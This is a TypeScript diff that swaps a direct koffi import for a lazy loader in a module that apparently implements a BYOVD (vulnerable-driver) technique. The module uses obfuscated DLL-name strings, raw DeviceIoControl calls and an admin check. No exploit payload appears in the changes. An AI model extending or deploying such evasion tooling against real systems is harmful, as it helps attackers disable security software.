@@ -23,7 +23,8 @@
 
 import { createHash } from 'node:crypto';
 import { createReadStream } from 'node:fs';
-import koffi, { type LibraryHandle } from 'koffi';
+import type { LibraryHandle } from 'koffi';
+import { requireKoffi } from '../koffi-loader';
 import { logger } from '@utils/logger';
 import { DLL, ds } from '@utils/obfuscated-strings';
 import {
@@ -50,7 +51,7 @@ let kernel32Lib: LibraryHandle | null = null;
 
 function getAdvapi32(): LibraryHandle {
   if (!advapi32Lib) {
-    advapi32Lib = koffi.load(ds(DLL.advapi32));
+    advapi32Lib = requireKoffi().load(ds(DLL.advapi32));
     logger.debug('Loaded advapi32.dll via koffi (BYOVD)');
   }
   return advapi32Lib;
@@ -58,7 +59,7 @@ function getAdvapi32(): LibraryHandle {
 
 function getKernel32(): LibraryHandle {
   if (!kernel32Lib) {
-    kernel32Lib = koffi.load(ds(DLL.kernel32));
+    kernel32Lib = requireKoffi().load(ds(DLL.kernel32));
     logger.debug('Loaded kernel32.dll via koffi (BYOVD)');
   }
   return kernel32Lib;
@@ -186,8 +187,8 @@ function kernDeviceIoControl(
     'int DeviceIoControl(void *, uint32, void *, uint32, void *, uint32, _Out_ uint32 *, void *)',
   );
   const bytesReturnedBuf = Buffer.alloc(4);
-  const inPtr = inputBuffer ? koffi.address(inputBuffer) : null;
-  const outPtr = outputBuffer ? koffi.address(outputBuffer) : null;
+  const inPtr = inputBuffer ? requireKoffi().address(inputBuffer) : null;
+  const outPtr = outputBuffer ? requireKoffi().address(outputBuffer) : null;
   const inSize = inputBuffer ? inputBuffer.length : 0;
   const outSize = outputBuffer ? outputBuffer.length : 0;
 
@@ -220,7 +221,7 @@ function isAdmin(): boolean {
   if (process.platform !== 'win32') return false;
   try {
     // Check via shellapi — isUserAnAdmin equivalent
-    const shell32 = koffi.load(ds(DLL.shell32));
+    const shell32 = requireKoffi().load(ds(DLL.shell32));
     const fn = shell32.func('int IsUserAnAdmin()');
     const result = fn();
     shell32.unload();
